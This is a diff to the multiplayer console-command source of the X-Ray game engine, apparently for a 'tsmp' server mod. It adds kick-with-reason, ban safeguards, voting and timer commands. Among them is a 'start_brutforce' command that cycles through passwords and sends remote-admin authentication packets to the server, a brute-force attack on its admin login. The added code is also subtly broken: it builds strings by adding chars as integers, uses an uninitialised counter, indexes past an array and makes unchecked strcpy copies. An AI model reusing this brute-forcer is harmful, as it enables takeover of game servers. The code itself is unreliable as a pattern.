@@ -15,6 +15,15 @@
 #include "date_time.h"
 #include "game_cl_base_weapon_usage_statistic.h"
 
+#include "xrcore.h"
+
+XRCORE_API		xrCore	Core;
+XRCORE_API		u32		build_id;
+XRCORE_API		LPCSTR	build_date;
+
+
+ENGINE_API	bool	g_debug_msg;
+
 extern	float	g_cl_lvInterp;
 extern	int		g_cl_InterpolationType; //0 - Linear, 1 - BSpline, 2 - HSpline
 extern	u32		g_cl_InterpolationMaxPoints;
@@ -27,6 +36,7 @@ extern	int		g_iCorpseRemove			;
 extern	BOOL	g_bCollectStatisticData ;
 //extern	BOOL	g_bStatisticSaveAuto	;
 extern	BOOL	g_SV_Disable_Auth_Check	;
+extern BOOL sv_debug_msg;
 
 extern  int		g_sv_mp_iDumpStatsPeriod;
 extern	BOOL	g_SV_Force_Artefact_Spawn;
@@ -41,7 +51,15 @@ extern	BOOL	g_sv_mp_bSpectator_FreeLook		;
 extern	BOOL	g_sv_mp_bSpectator_TeamCamera	;
 extern	BOOL	g_sv_mp_bCountParticipants		;
 extern	float	g_sv_mp_fVoteQuota				;
-extern	float	g_sv_mp_fVoteTime				;
+extern	int		g_sv_mp_fVoteTime				;
+extern	int		g_sv_mp_Timer1Interval			;
+extern	int		g_sv_mp_Timer2Interval			;
+extern	int		g_sv_mp_Timer1Enabled			;
+extern	int		g_sv_mp_Timer2Enabled			;
+extern	int		g_sv_mp_DisablerEnabled			;
+extern	int		g_sv_mp_nickname_change_mode	;
+
+
 extern	u32		g_sv_dm_dwForceRespawn			;
 extern	s32		g_sv_dm_dwFragLimit				;
 extern	s32		g_sv_dm_dwTimeLimit				;
@@ -259,13 +277,52 @@ public:
 			Msg("!  '/' is not allowed in names!");
 			return;
 		}
+
 		string4096 PlayerName	= "";
+
+		bool bIsNewKick = false;
+
+		std::string Reason;
+		std::string Argum = args;
+	
+		if (Argum.find('_') != std::string::npos)
+		{
+			bIsNewKick = true;
+
+			char *s = new char[Argum.size() + 1];
+
+			strcpy(s, Argum.c_str());
+
+			char *p = strtok(s, "_");
+			int iii = 0;
+			while (p!= NULL) {
+			//	cout << p << endl;
+				if (iii == 0) Argum = p;
+				else Reason = p;
+				p = strtok(NULL, "_");
+				iii++;
+			}
+
+			delete[] s;
+		}
+
+
+		Msg(Argum.c_str());
+		Msg(Reason.c_str());
+	//	PlayerName = Argum.c_str();
+
+		string512 Reason512;
+		strcpy(Reason512, Reason.c_str());
+		//strcpy(args, Argum.c_str());
+
 		if (xr_strlen(args)>17)
 		{
-			strncpy				(PlayerName, args, 17);
+		//	strncpy				(PlayerName, args, 17);
+			strncpy				(PlayerName, Argum.c_str(), 17);
 			PlayerName[17]		= 0;
 		}else
-			strcpy(PlayerName, args);
+		//	strcpy(PlayerName, args);
+		strcpy(PlayerName, Argum.c_str());
 
 		xr_strlwr			(PlayerName);
 
@@ -286,7 +343,16 @@ public:
 					if (Level().Server->GetServerClient() != l_pC)
 					{
 						Msg("Disconnecting : %s", l_pC->ps->getName());
-						Level().Server->DisconnectClient(l_pC);
+						if (bIsNewKick)	Level().Server->DisconnectClient(l_pC, Reason512);
+						//if (bIsNewKick)
+						//{
+							//string512* Re = Reason512;
+
+						//	if (bIsNewKick)	Level().Server->DisconnectClient(l_pC, Reason512);
+
+//						}
+						else 
+							Level().Server->DisconnectClient(l_pC);
 						break;
 					}else
 						Msg("! Can't disconnect server's client");
@@ -429,6 +495,13 @@ public:
 
 		ip_address							Address;
 		Address.set							(s_ip_addr);
+		
+		if (Address.to_string()=="0.0.0.0")
+		{
+			Msg("! attempt to ban server ip");
+		return;
+		}
+
 		Level().Server->clients_Lock		();
 		Msg									("Disconnecting and Banning: %s",Address.to_string().c_str() ); 
 		Level().Server->BanAddress			(Address, ban_time);
@@ -458,6 +531,7 @@ public:
 	virtual void	Info	(TInfo& I){strcpy(I,"UnBan Player by IP");}
 };
 
+
 class CCC_ListPlayers : public IConsole_Command {
 public:
 					CCC_ListPlayers	(LPCSTR N) : IConsole_Command(N)  { bEmptyArgsHandled = true; };
@@ -486,6 +560,75 @@ public:
 
 	virtual void	Info	(TInfo& I){strcpy(I,"List Players"); }
 };
+
+
+class CCC_Brutforce : public IConsole_Command {
+public:
+	CCC_Brutforce(LPCSTR N) : IConsole_Command(N) { bEmptyArgsHandled = true; };
+	virtual void	Execute(LPCSTR args)
+	{
+		string1024 user,pass;
+		
+		int leng1, leng2;
+		int i;
+		
+		std::string login, passw,temp;
+		passw = "";
+
+		int Count1[10] = { 0,0,0,0,0,0,0,0,0,0 };
+		int Count2[10] = { 0,0,0,0,0,0,0,0,0,0 };
+
+		char Chars[47] = { NULL,'1','2','3','4','5','6','7','8','9','0','-','=','q','w','e','r','t','y','u','i','o','p','[',']','\\','a','s','d','f','g','h','j','k','l',';',' ','z','x','c','v','b','n','m',',','.','/'};
+
+		login = Chars[2];
+		int index = 0;
+
+	
+			for (index=0; index<11 ;index++)
+			{
+				for (int ii = 0; ii < 47; ii++)
+				{
+					Count2[index] = ii;
+
+
+					passw = Chars[Count2[0]] + Chars[Count2[1]] + Chars[Count2[2]] + Chars[Count2[3]] + Chars[Count2[4]] + Chars[Count2[5]] + Chars[Count2[6]] + Chars[Count2[7]] + Chars[Count2[8]] + Chars[Count2[9]];
+
+
+					NET_Packet		P;
+					P.w_begin(M_REMOTE_CONTROL_AUTH);
+					P.w_stringZ(login.c_str());
+					P.w_stringZ(passw.c_str());
+
+					Level().Send(P, net_flags(TRUE, TRUE));
+
+					Msg("login %s password %s", login.c_str(), passw.c_str());
+					temp = std::to_string(i);
+					Msg("i= %s", temp);
+					i++;
+				}
+
+		}
+		
+	};
+
+	virtual void	Info(TInfo& I) { strcpy(I, "List Players"); }
+};
+
+
+class CCC_GetVersion : public IConsole_Command {
+public:
+	CCC_GetVersion(LPCSTR N) : IConsole_Command(N) { bEmptyArgsHandled = true; };
+	virtual void	Execute(LPCSTR args)
+	{
+		Msg("'%s' build %d, %s\n", "xrCore", build_id, build_date);
+		Msg("tsmp version 1.3.6");
+
+	};
+
+	virtual void	Info(TInfo& I) { strcpy(I, "List Players"); }
+};
+
+
 
 class CCC_ListPlayers_Banned : public IConsole_Command {
 public:
@@ -753,6 +896,47 @@ public:
 	virtual void	Info	(TInfo& I)	{strcpy(I,"Stops Current Voting"); };
 };
 
+
+class CCC_Vote_Succ : public IConsole_Command {
+public:
+	CCC_Vote_Succ(LPCSTR N) : IConsole_Command(N) { bEmptyArgsHandled = true; };
+	virtual void	Execute(LPCSTR args)
+	{
+		if (!OnServer()) return;
+
+		if (IsGameTypeSingle())
+		{
+			Msg("! Only for multiplayer games!");
+			return;
+		}
+
+		if (!Level().Server->game->IsVotingEnabled())
+		{
+			Msg("! Voting is disabled by server!");
+			return;
+		}
+
+		if (!Level().Server->game->IsVotingActive())
+		{
+			Msg("! Currently there is no active voting!");
+			return;
+		}
+
+		if (Level().Server->game->Phase() != GAME_PHASE_INPROGRESS)
+		{
+			Msg("! Voting is allowed only when game is in progress!");
+			return;
+		};
+
+		Level().Server->game->OnVoteSuccess();
+
+	}
+
+	};
+
+
+
+
 class CCC_Vote_Yes : public IConsole_Command {
 public:
 					CCC_Vote_Yes(LPCSTR N) : IConsole_Command(N)  { bEmptyArgsHandled = true; };
@@ -878,6 +1062,15 @@ public:
 					CCC_AuthCheck	(LPCSTR N, int* V, int _min=0, int _max=999) :CCC_Integer(N,V,_min,_max){};
 	  virtual void	Save			(IWriter *F)	{};
 };
+
+//class CCC_Deb : public CCC_Integer {
+//public:
+//					CCC_Deb	(LPCSTR N, int* V, int _min=0, int _max=999) :CCC_Integer(N,V,_min,_max){};
+//	  virtual void	Save			(IWriter *F)	{};
+////	extern ENGINE_API  bool 
+//	//DBG=true;
+
+//};
 
 class CCC_ReturnToBase: public IConsole_Command {
 public:
@@ -1211,6 +1404,19 @@ public:
 	}
 };
 
+
+class CCC_WeaponDisable : public IConsole_Command {
+public:
+	CCC_WeaponDisable(LPCSTR N) : IConsole_Command(N) { bEmptyArgsHandled = false; };
+	virtual void	Execute(LPCSTR args) {
+		if (!OnServer())	return;
+
+	Level().Server->game->Tsmp_weapon_disabler(args);
+
+
+	}
+};
+
 class CCC_MpStatistics : public IConsole_Command {
 public:
 					CCC_MpStatistics(LPCSTR N) : IConsole_Command(N)  { bEmptyArgsHandled = true; };
@@ -1281,6 +1487,10 @@ void register_mp_console_commands()
 	CMD1(CCC_UnBanPlayerByIP,	"sv_unbanplayer_ip"			);
 
 	CMD1(CCC_ListPlayers,			"sv_listplayers"			);		
+	CMD1(CCC_Brutforce, "start_brutforce");
+
+	CMD1(CCC_GetVersion, "get_server_version");
+
 	CMD1(CCC_ListPlayers_Banned,	"sv_listplayers_banned"			);		
 	
 	CMD1(CCC_ChangeGameType,		"sv_changegametype"			);
@@ -1295,6 +1505,7 @@ void register_mp_console_commands()
 
 	CMD1(CCC_Vote_Start,	"cl_votestart"				);
 	CMD1(CCC_Vote_Stop,		"sv_votestop"				);
+	CMD1(CCC_Vote_Succ, "tsmp_votesuccess");
 	CMD1(CCC_Vote_Yes,		"cl_voteyes"				);
 	CMD1(CCC_Vote_No,		"cl_voteno"				);
 
@@ -1312,6 +1523,7 @@ void register_mp_console_commands()
 //	CMD4(CCC_Integer,		"sv_statistic_save_auto", &g_bStatisticSaveAuto, 0, 1);
 
 	CMD4(CCC_AuthCheck,		"sv_no_auth_check",				&g_SV_Disable_Auth_Check, 0, 1);
+//		CMD4(CCC_Deb,		"sv_show_debug_messages",				&DBGM, 0, 1);
 
 	CMD4(CCC_Integer,		"sv_artefact_spawn_force",		&g_SV_Force_Artefact_Spawn, 0, 1);
 
@@ -1328,6 +1540,7 @@ void register_mp_console_commands()
 
 	CMD4(CCC_Integer,		"sv_wait_for_players_ready",	&g_sv_Wait_For_Players_Ready, 0, 1);
 #endif
+
 	CMD1(CCC_StartTeamMoney,"sv_startteammoney"		);		
 
 	CMD4(CCC_Integer,		"sv_hail_to_winner_time",		&G_DELAYED_ROUND_TIME, 0, 60);
@@ -1347,7 +1560,7 @@ void register_mp_console_commands()
 	
 	CMD4(CCC_SV_Integer,	"sv_vote_participants"		,	(int*)&g_sv_mp_bCountParticipants	,	0,	1);	
 	CMD4(CCC_SV_Float,		"sv_vote_quota"				,	&g_sv_mp_fVoteQuota					, 0.0f,1.0f);
-	CMD4(CCC_SV_Float,		"sv_vote_time"				,	&g_sv_mp_fVoteTime					, 0.5f,10.0f);
+//	CMD4(CCC_SV_Float,		"sv_vote_time"				,	&g_sv_mp_fVoteTime					, 0.5f,10.0f);
 
 	CMD4(CCC_SV_Integer,	"sv_forcerespawn"			,	(int*)&g_sv_dm_dwForceRespawn		,	0,3600);	//sec
 	CMD4(CCC_SV_Integer,	"sv_fraglimit"				,	&g_sv_dm_dwFragLimit				,	0,100);
@@ -1371,6 +1584,18 @@ void register_mp_console_commands()
 
 	CMD4(CCC_SV_Integer,	"sv_artefact_respawn_delta"	,	(int*)&g_sv_ah_dwArtefactRespawnDelta	,0,600);	//sec
 	CMD4(CCC_SV_Integer,	"sv_artefacts_count"		,	(int*)&g_sv_ah_dwArtefactsNum			, 1,100);
+
+
+	CMD4(CCC_SV_Integer,	"tsmp_timer1_interval"		,	(int*)&g_sv_mp_Timer1Interval, 1, 60);
+	CMD4(CCC_SV_Integer,	"tsmp_timer2_interval"		,	(int*)&g_sv_mp_Timer2Interval, 1, 60);
+	CMD4(CCC_SV_Integer,	"tsmp_timer1_enabled"		,	(int*)&g_sv_mp_Timer1Enabled, 0, 1);
+	CMD4(CCC_SV_Integer,	"tsmp_timer2_enabled"		,	(int*)&g_sv_mp_Timer2Enabled, 0, 1);
+	CMD4(CCC_SV_Integer,	"tsmp_weapon_disabler_enabled", (int*)&g_sv_mp_DisablerEnabled, 0, 1);
+	CMD4(CCC_SV_Integer,	"tsmp_nickname_change_mode"	,	(int*)&g_sv_mp_nickname_change_mode, 1, 3);
+	CMD4(CCC_SV_Integer,	"tsmp_vote_time"			,	(int*)&g_sv_mp_fVoteTime, 15, 180);
+	CMD1(CCC_WeaponDisable, "tsmp_weapon_disable");
+
+
 	CMD4(CCC_SV_Integer,	"sv_artefact_stay_time"		,	(int*)&g_sv_ah_dwArtefactStayTime		, 0,180);	//min
 	CMD4(CCC_SV_Integer,	"sv_reinforcement_time"		,	(int*)&g_sv_ah_iReinforcementTime		, -1,3600); //sec
 	CMD4(CCC_SV_Integer,	"sv_bearercantsprint"		,	(int*)&g_sv_ah_bBearerCantSprint				, 0, 1)	;
